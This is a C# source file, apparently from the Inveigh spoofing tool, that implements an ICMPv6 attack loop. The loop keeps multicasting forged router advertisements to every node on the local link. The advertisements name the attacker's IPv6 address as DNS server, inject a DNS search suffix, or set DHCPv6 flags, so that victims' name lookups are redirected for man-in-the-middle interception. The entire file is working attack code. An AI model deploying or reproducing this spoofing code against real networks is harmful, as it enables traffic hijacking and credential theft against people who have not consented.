using Quiddity.ICMPv6;
using Quiddity.Support;
using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Inveigh
{
    class ICMPv6Socket
    {
        internal void Start()
        {
            string responseMessage = " ";
            byte[] spooferIPv6Data = IPAddress.Parse(Program.argSpooferIPv6).GetAddressBytes();
            Stopwatch stopwatchInterval = new Stopwatch();
            stopwatchInterval.Start();

            while (Program.isRunning && Program.enabledICMPv6)
            {

                ICMPv6RouterAdvertisement routerAdvertisement = new ICMPv6RouterAdvertisement
                {
                    RouterLifeTime = ushort.Parse(Program.argICMPv6TTL)
                };

                if (Program.enabledDHCPv6)
                {
                    routerAdvertisement.Flags = 0xc8;                  
                }
                else if (!string.IsNullOrEmpty(Program.argDNSSuffix))
                {
                    routerAdvertisement.Flags = 0x08;
                    responseMessage = " with DNS Suffix ";
                    byte[] dnsSearchListData = Utilities.GetDNSNameBytes(Program.argDNSSuffix, true);
                    int length = (int)Math.Ceiling((double)(dnsSearchListData.Length + 8) / 8);
                    int lengthAdjusted = length * 8 - 8;
                    byte[] dnsSearchListDataAdjusted = new byte[lengthAdjusted];
                    Buffer.BlockCopy(dnsSearchListData, 0, dnsSearchListDataAdjusted, 0, dnsSearchListData.Length);

                    ICMPv6DNSSearchList dnsSearchList = new ICMPv6DNSSearchList
                    {
                        Length = (byte)length,
                        Lifetime = uint.Parse(Program.argICMPv6TTL),
                        DomainNames = dnsSearchListDataAdjusted
                    };

                    routerAdvertisement.Options = dnsSearchList.GetBytes();
                }
                else
                {
                    routerAdvertisement.Flags = 0x08;
                    responseMessage = " with DNSv6 ";

                    ICMPv6RecursiveDNS recursiveDNS = new ICMPv6RecursiveDNS
                    {
                        Length = 3,
                        Lifetime = uint.Parse(Program.argICMPv6TTL),
                        RecursiveDNSServers = spooferIPv6Data
                    };

                    routerAdvertisement.Options = recursiveDNS.GetBytes();
                }

                try
                {
                    byte[] sendBuffer = routerAdvertisement.GetBytes();
                    Socket icmpv6SendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.IcmpV6);
                    icmpv6SendSocket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.MulticastInterface, Program.networkInterfaceIndexIPv6);
                    icmpv6SendSocket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.MulticastTimeToLive, 255);
                    icmpv6SendSocket.SendBufferSize = sendBuffer.Length;
                    IPEndPoint icmpv6EndPoint = new IPEndPoint(IPAddress.Parse("ff02::1"), 0);
                    icmpv6SendSocket.SendTo(sendBuffer.ToArray(), sendBuffer.Length, SocketFlags.None, icmpv6EndPoint);
                    icmpv6SendSocket.Close();
                    Output.Queue(String.Format("[+] [{0}] ICMPv6 router advertisement{1}sent to [ff02::1]", Output.Timestamp(), responseMessage));
                }
                catch (Exception ex)
                {

                    if (ex.Message.Equals("An attempt was made to access a socket in a way forbidden by its access permissions"))
                    {
                        Output.Queue(String.Format("[!] [{0}] ICMPv6 router advertisment failed [elevated access required]", Output.Timestamp()));
                        Program.enabledICMPv6 = false;
                    }
                    else
                    {
                        Console.WriteLine(ex);
                    }

                }

                if (Program.icmpv6Interval > 0)
                {

                    while (Program.isRunning && stopwatchInterval.Elapsed.TotalSeconds <= Program.icmpv6Interval)
                    {
                        Thread.Sleep(10);
                    }

                    stopwatchInterval.Reset();
                    stopwatchInterval.Start();
                }
                else
                {
                    break;
                }
                
            }

        }
    }
}
